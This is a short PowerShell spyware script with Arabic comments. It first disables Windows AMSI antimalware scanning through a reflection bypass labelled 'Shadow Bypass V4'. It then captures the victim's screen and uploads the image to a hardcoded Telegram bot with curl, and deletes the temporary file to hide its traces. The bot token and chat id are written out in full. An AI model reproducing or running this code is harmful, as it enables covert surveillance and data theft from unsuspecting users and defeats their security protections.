# --- [1] كسر الحماية (Shadow Bypass V4) ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات البوت ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# --- [3] ميكانيكا التقاط الشاشة ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# تحديد أبعاد الشاشة الأساسية
$Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$Bitmap = New-Object System.Drawing.Bitmap($Screen.Width, $Screen.Height)
$Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)

# التقاط الصورة
$Graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $Bitmap.Size)

# حفظ الصورة مؤقتاً
$Path = "$env:TEMP\sys_snapshot_$(Get-Random).png"
$Bitmap.Save($Path, [System.Drawing.Imaging.ImageFormat]::Png)

# إرسال الصورة للبوت كـ Photo (عشان تظهر قدامك علطول)
curl.exe -F "chat_id=$c" -F "photo=@$Path" "https://api.telegram.org/bot$t/sendPhoto"

# تنظيف الجهاز
$Graphic.Dispose()
$Bitmap.Dispose()
Remove-Item $Path -Force
